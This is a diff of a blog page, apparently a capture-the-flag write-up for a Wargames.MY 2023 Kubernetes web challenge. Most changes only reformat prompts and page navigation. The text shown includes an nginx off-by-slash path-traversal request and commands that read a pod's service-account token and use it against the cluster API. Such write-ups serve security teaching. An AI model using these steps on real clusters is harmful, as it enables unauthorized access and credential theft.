@@ -102,7 +102,7 @@
     "keywords": ["nginx","off-by-slash"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1304"
+    "wordCount": "1281"
   }]
   </script>
 
@@ -810,7 +810,7 @@
 <details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" >
     <summary
         class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
-        Wargames.MY 2023 web k8s - This article is part of a series.
+        Wargames.MY 2023 web-k8s - This article is part of a series.
     </summary>
     
     
@@ -891,8 +891,8 @@ may not be accurate.</span>
 <p>The challenge description links us to <code>/api/status.php</code> endpoint but there is
 nothing much in it. If we take look at the file content directly, we could see
 that it is using <code>kubectl</code> to get the status of the deployments.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/var/www/api $ cat status.php
-</span></span></span><span class="line"><span class="cl"><span class="go">&lt;?php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat status.php
+</span></span><span class="line"><span class="cl"><span class="go">&lt;?php
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">error_reporting(0);
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -901,8 +901,8 @@ that it is using <code>kubectl</code> to get the status of the deployments.</p>
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">echo($ok ? &#39;ok&#39; : &#39;not ok&#39;);
 </span></span></span></code></pre></div><p>If we check the environment variables, we could see a bunch of stuff concerning
 with k8s (kubernetes).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/var/www/api $ env
-</span></span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_PORT=tcp://10.43.0.1:443
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> env
+</span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_PORT=tcp://10.43.0.1:443
 </span></span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_SERVICE_PORT=443
 </span></span></span><span class="line"><span class="cl"><span class="go">USER=www-data
 </span></span></span><span class="line"><span class="cl"><span class="go">HOSTNAME=wgmy-webtestonetwothree-backend-7bc587fcd8-p4ksj
@@ -947,8 +947,8 @@ with k8s (kubernetes).</p>
 while the initial page with password input box that we interact with is the frontend.</p>
 <p>The next thing that we could do is to see what actions we could perform on the
 k8s cluster.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ kubectl auth can-i --list
-</span></span></span><span class="line"><span class="cl"><span class="go">Resources                                       Non-Resource URLs                      Resource Names                       Verbs
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kubectl auth can-i --list
+</span></span><span class="line"><span class="cl"><span class="go">Resources                                       Non-Resource URLs                      Resource Names                       Verbs
 </span></span></span><span class="line"><span class="cl"><span class="go">selfsubjectreviews.authentication.k8s.io        []                                     []                                   [create]
 </span></span></span><span class="line"><span class="cl"><span class="go">selfsubjectaccessreviews.authorization.k8s.io   []                                     []                                   [create]
 </span></span></span><span class="line"><span class="cl"><span class="go">selfsubjectrulesreviews.authorization.k8s.io    []                                     []                                   [create]
@@ -977,8 +977,8 @@ k8s cluster.</p>
 </span></span></span></code></pre></div><p>Most of the permissions are default like interacting with the k8s master API endpoints.
 The one that is useful for us is the last 2 lines.</p>
 <ul>
-<li>the second last line means that we could get <strong>any</strong> <code>configmaps</code> data</li>
-<li>the last line means that we could <strong>only</strong> get <code>deployments</code> data named <code>wgmy-webtestonetwothree-frontend</code></li>
+<li>the second last line means that we could <code>get</code> <strong>any</strong> <code>configmaps</code> data</li>
+<li>the last line means that we could <code>get</code> <strong>only</strong> <code>deployments</code> data named <code>wgmy-webtestonetwothree-frontend</code></li>
 </ul>
 <h2 class="relative group">Getting Deployments Data 
     <div id="getting-deployments-data" class="anchor"></div>
@@ -993,11 +993,12 @@ The one that is useful for us is the last 2 lines.</p>
 <p>To get the <code>deployments</code> data simply do <code>kubectl get deployments &lt;resource name&gt;</code>.
 Optionally we could also be more specific by specify the namespace (from <code>/var/www/api/status.php</code>)
 <code>kubectl -n wgmy get deployments &lt;resource name&gt;</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ kubectl get deployments wgmy-webtestonetwothree-frontend
-</span></span></span><span class="line"><span class="cl"><span class="go">NAME                               READY   UP-TO-DATE   AVAILABLE   AGE
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kubectl get deployments wgmy-webtestonetwothree-frontend
+</span></span><span class="line"><span class="cl"><span class="go">NAME                               READY   UP-TO-DATE   AVAILABLE   AGE
 </span></span></span><span class="line"><span class="cl"><span class="go">wgmy-webtestonetwothree-frontend   2/2     2            2           35h
-</span></span></span><span class="line"><span class="cl"><span class="go">/tmp $ kubectl get deploy wgmy-webtestonetwothree-frontend -o yaml
-</span></span></span><span class="line"><span class="cl"><span class="go">apiVersion: apps/v1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> kubectl get deploy wgmy-webtestonetwothree-frontend -o yaml
+</span></span><span class="line"><span class="cl"><span class="go">apiVersion: apps/v1
 </span></span></span><span class="line"><span class="cl"><span class="go">kind: Deployment
 </span></span></span><span class="line"><span class="cl"><span class="go">metadata:
 </span></span></span><span class="line"><span class="cl"><span class="go">  annotations:
@@ -1171,7 +1172,7 @@ endpoint directly, see <a href="#appendix"  >
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="l">...]</span><span class="w">
 </span></span></span></code></pre></div><p>I assume that the <code>name</code> under <code>volumeMounts</code> refers to the <code>name</code> under <code>volumes</code>.
 Hence, the <code>nginx</code> config can be retrieved from <code>wgmy-webtestonetwothree-frontend-conf</code></p>
-<pre tabindex="0"><code>/tmp $ kubectl get configmaps wgmy-webtestonetwothree-frontend-conf -o yaml
+<pre tabindex="0"><code>$ kubectl get configmaps wgmy-webtestonetwothree-frontend-conf -o yaml
 apiVersion: v1
 data:
   default.conf: |
@@ -1256,8 +1257,8 @@ metadata:
 </span></span></code></pre></div><p>We could see that there is <code>off-by-slash</code> on <code>/static</code> which allows us to
 read the <code>.lemme_try_hiding_flag_with_dot_in_front/flag_for_status</code> file by
 accessing <code>/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ env | grep FRONTEND
-</span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_ADDR=10.43.246.102
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> env <span class="p">|</span> grep FRONTEND
+</span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_ADDR=10.43.246.102
 </span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PORT=80
 </span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PROTO=tcp
 </span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP=tcp://10.43.246.102:80
@@ -1265,17 +1266,18 @@ accessing <code>/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_stat
 </span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_HOST=10.43.246.102
 </span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT=80
 </span></span></span><span class="line"><span class="cl"><span class="go">WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT=tcp://10.43.246.102:80
-</span></span></span><span class="line"><span class="cl"><span class="go">/tmp $ nslookup 10.43.246.102
-</span></span></span><span class="line"><span class="cl"><span class="go">Server:         10.43.0.10
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> nslookup 10.43.246.102
+</span></span><span class="line"><span class="cl"><span class="go">Server:         10.43.0.10
 </span></span></span><span class="line"><span class="cl"><span class="go">Address:        10.43.0.10:53
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">102.246.43.10.in-addr.arpa      name = wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">/tmp $ curl -s -L http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
-</span></span></span><span class="line"><span class="cl"><span class="go">wgmy{21c47f8225240bd1b87e9060986ddb4f}/tmp $
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl -s -L http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
+</span></span><span class="line"><span class="cl"><span class="go">wgmy{21c47f8225240bd1b87e9060986ddb4f}
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">/tmp $ curl -s -L http://10.43.246.102/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
-</span></span></span><span class="line"><span class="cl"><span class="go">wgmy{21c47f8225240bd1b87e9060986ddb4f}
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl -s -L http://10.43.246.102/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
+</span></span><span class="line"><span class="cl"><span class="go">wgmy{21c47f8225240bd1b87e9060986ddb4f}
 </span></span></span></code></pre></div><p>flag: <code>wgmy{21c47f8225240bd1b87e9060986ddb4f}</code></p>
 <p><a href="../secret/"  >
     Next</a>, we would look at the other <code>nginx</code> endpoint, i.e., <code>/internal-secret</code>
@@ -1317,10 +1319,10 @@ to get the other flag.</p>
     
 </h3>
 <p>To interact with the API, we need to get the <code>serviceaccount</code> token.</p>
-<pre tabindex="0"><code>/tmp $ cat /var/run/secrets/kubernetes.io/serviceaccount/token
+<pre tabindex="0"><code>$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
 eyJhbGciOiJSUzI1NiIsImtpZCI6Im5oUXBoT0FLNVY5U2llMDR2ZFpfeDByYlpCVEtRQlVDUlB[...]
 
-/tmp $ cat /var/run/secrets/kubernetes.io/serviceaccount/token &gt; token
+$ export k8s_token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 </code></pre><h3 class="relative group">Getting Other Services IP and Domain Name 
     <div id="getting-other-services-ip-and-domain-name" class="anchor"></div>
     
@@ -1334,8 +1336,8 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Im5oUXBoT0FLNVY5U2llMDR2ZFpfeDByYlpCVEtRQlVDUlB[...]
 <p>Next, we can use the token in the HTTP header <code>Authorization: Bearer &lt;token&gt;</code> and
 use <code>curl</code> on the k8s master ip which can be retrieved from the environment variable
 or use the domain name by reverse nslookup the IP or follow the naming convention</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ env | grep ^KUBERNETES
-</span></span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_PORT=tcp://10.43.0.1:443
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> env <span class="p">|</span> grep ^KUBERNETES
+</span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_PORT=tcp://10.43.0.1:443
 </span></span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_SERVICE_PORT=443
 </span></span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
 </span></span></span><span class="line"><span class="cl"><span class="go">KUBERNETES_PORT_443_TCP_PORT=443
@@ -1355,8 +1357,8 @@ or use the domain name by reverse nslookup the IP or follow the naming conventio
 </span></span></code></pre></div><p>Refer to this <a href="https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-uris"   target="_blank">
     documentation</a>
 on how to determine the API endpoint. Furthermore, you can browse <code>/apis</code> and use the <code>name</code> field to build the next part after <code>/apis</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ curl -s -k -H &#34;Authorization: Bearer $(cat token)&#34; https://kubernetes.default.svc.cluster.local/apis/ | grep name
-</span></span></span><span class="line"><span class="cl"><span class="go">      &#34;name&#34;: &#34;apiregistration.k8s.io&#34;,
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl -s -k -H <span class="s2">&#34;Authorization: Bearer </span><span class="si">${</span><span class="nv">k8s_token</span><span class="si">}</span><span class="s2">&#34;</span> https://kubernetes.default.svc.cluster.local/apis/ <span class="p">|</span> grep name
+</span></span><span class="line"><span class="cl"><span class="go">      &#34;name&#34;: &#34;apiregistration.k8s.io&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="go">      &#34;name&#34;: &#34;apps&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="go">      &#34;name&#34;: &#34;events.k8s.io&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="go">      &#34;name&#34;: &#34;authentication.k8s.io&#34;,
@@ -1423,17 +1425,17 @@ the pattern (which could be wrong as well)</span>
 </div>
 
 <p>I use <code>/apis/apps</code> from the assumption of <code>kubectl auth can-i --list</code> output: <code>deployments.apps</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ curl -s -k -H &#34;Authorization: Bearer $(cat token)&#34; https://kubernetes.default.svc.cluster.local/apis/apps/v1/namespaces/wgmy/deployments/wgmy-webtestonetwothree-frontend
-</span></span></span></code></pre></div><p>I use <code>/api</code> directly based on the assumption that since the <code>kubectl auth can-i --list</code> output is only: <code>configmaps</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">/tmp $ curl -s -k -H &#34;Authorization: Bearer $(cat token)&#34; https://kubernetes.default.svc.cluster.local/api/v1/namespaces/wgmy/configmaps/wgmy-webtestonetwothree-frontend-conf
-</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -s -k -H <span class="s2">&#34;Authorization: Bearer </span><span class="si">${</span><span class="nv">k8s_token</span><span class="si">}</span><span class="s2">&#34;</span> https://kubernetes.default.svc.cluster.local/apis/apps/v1/namespaces/wgmy/deployments/wgmy-webtestonetwothree-frontend
+</span></span></code></pre></div><p>I use <code>/api</code> directly based on the assumption that since the <code>kubectl auth can-i --list</code> output is only: <code>configmaps</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -s -k -H <span class="s2">&#34;Authorization: Bearer </span><span class="si">${</span><span class="nv">k8s_token</span><span class="si">}</span><span class="s2">&#34;</span> https://kubernetes.default.svc.cluster.local/api/v1/namespaces/wgmy/configmaps/wgmy-webtestonetwothree-frontend-conf
+</span></span></code></pre></div>
         </div>
                 
         
 <details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
     <summary
         class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
-        Wargames.MY 2023 web k8s - This article is part of a series.
+        Wargames.MY 2023 web-k8s - This article is part of a series.
     </summary>
     
     
@@ -1630,155 +1632,6 @@ the pattern (which could be wrong as well)</span>
 
 <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
 <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
-  
-  
-
-  <a href="/posts/wgmy2023/web/secret/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/wgmy2023/web/secret/">Secret</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div style="cursor: default;" class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2023-12-17 07:49:56 &#43;0800 &#43;08">17 December 2023</time>
-  
-
-  
-  
-</div>
-
-
-
-
-
-<div style="cursor: pointer;" class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/wgmy2023/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    wgmy2023
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/web/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    web
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/k8s/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    k8s
-  </span>
-</span>
-
-  </span>
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hashicorp-vault/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    hashicorp vault
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/k8s/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    k8s
-  </span>
-</span>
-
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-        </div>
-
-        
-        <div class="py-1 prose dark:prose-invert">
-          Read secret from HashiCorp vault
-        </div>
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
   
   
 
@@ -2056,6 +1909,133 @@ the pattern (which could be wrong as well)</span>
     </div>
   </a>
   
+  
+
+  <a href="/posts/pwc-hackaday-23/web/php-code-review-2/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/pwc-hackaday-23/web/php-code-review-2/">PHP Code Review 2</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div style="cursor: default;" class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2023-11-08 00:00:00 &#43;0000 UTC">8 November 2023</time>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div style="cursor: pointer;" class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/pwc-ctf-hack-a-day-2023-securing-ai/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    PwC CTF: Hack A Day 2023 - Securing AI
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/web/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    web
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/php/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    php
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+        </div>
+
+        
+        <div class="py-1 prose dark:prose-invert">
+          Triggering error to reach <code>catch</code> block
+        </div>
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+  
 </section>
 
   
@@ -2082,7 +2062,7 @@ the pattern (which could be wrong as well)</span>
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/wgmy2023/web/secret/">
+            <a class="flex group mr-3" href="/posts/wgmy2023/web/warmup/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -2094,7 +2074,7 @@ the pattern (which could be wrong as well)</span>
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Secret</span
+                  >Warmup</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
@@ -2106,6 +2086,28 @@ the pattern (which could be wrong as well)</span>
           
         </span>
         <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/wgmy2023/web/secret/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Secret</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-12-17 10:29:56 &#43;0800 &#43;08">17 December 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
           
         </span>
       </div>
